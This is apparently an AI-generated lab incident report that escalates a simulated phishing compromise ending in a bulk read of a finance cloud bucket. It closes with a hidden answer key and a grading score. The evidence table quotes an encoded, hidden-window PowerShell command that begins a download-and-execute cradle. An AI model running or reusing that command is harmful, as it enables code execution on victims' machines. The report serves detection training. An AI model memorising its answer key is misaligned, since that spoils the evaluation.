# INC-0088: ESCALATE

**User:** bob.smith  ·  **Window:** 2026-10-11T01:04:35+00:00 to 2026-10-11T01:38:23+00:00  ·  **Risk:** 0.956  ·  **Techniques:** T1566.002, T1078.004, T1069.002, T1530, T1059.001
**Detections:** BEH-001, DET-001, DET-002, DET-003, DET-004, DET-005  ·  **Run:** main_critic (ollama:qwen2.5:7b, mode evidence)

## Decision
- **Final (AI + controls):** ESCALATE
- **AI recommendation:** escalate (true_positive, confidence 0.95)

## Summary
The sequence of events, including the phishing click, new device sign-in, group discovery, and bulk read of sensitive cloud data, strongly indicate a potential attack. The lack of a travel notice and the new IP accessing critical data further support this conclusion.

## Evidence (3 of 3 observed claims verified, observation ratio 1.0)
| Observed | Source | Quote |
|---|---|---|
| Bob Smith clicked a link in an email from an external sender (invoice-portal.co) and then signed in from a new device in a new country (NG / DEV-11679) | D000048, D000054 | `invoice-portal.co` |
| Bob Smith executed PowerShell with an encoded command (T1059.001) and then read objects from the finance-reports bucket (T1530) | D000049, D000067 | `powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA` |
| Bob Smith accessed the finance-reports bucket (T1530) from a new IP (198.51.100.211) and a new user agent (python-requests/2.31) | D000067 | `python-requests/2.31` |

## Why it matters
- **WS-BOB**: workstation, owner bob.smith, criticality low. Sales laptop
- **finance-reports** **(crown jewel)**: cloud_bucket, owner Finance, criticality critical. Quarterly financials, board packs; exports require a change ticket
- **New for this user:** sign-in country + device = `NG / DEV-11679`
- AI cited asset or baseline facts: no

## Alternative hypothesis
The new device and new country sign-in could be part of a legitimate travel, but the lack of a travel notice and the sequence of events (phishing click, new device sign-in, group discovery, sensitive cloud read) suggest a potential attack. The new IP and user agent accessing the finance-reports bucket also raise concerns.

## Next steps for the analyst
- [ ] Whether the new device and new country sign-in was part of a legitimate travel or a malicious activity.

---
_Lab answer key (not visible to an analyst): MALICIOUS, scenario with_decoy._
_Investigation score: 82.6/100. Gates: ✓ T1566.002 phishing link click (5); ✓ T1059.001 encoded PowerShell from Office (10); ✓ T1078.004 sign-in from new device / attacker IP (15); ✗ T1069.002 privileged group discovery (20); ✓ T1530 bulk read of cloud data (25); ✓ attacker IP stated (10); ✓ phishing domain stated (15); ✓ legitimate activity kept out of the attack narrative (15)._
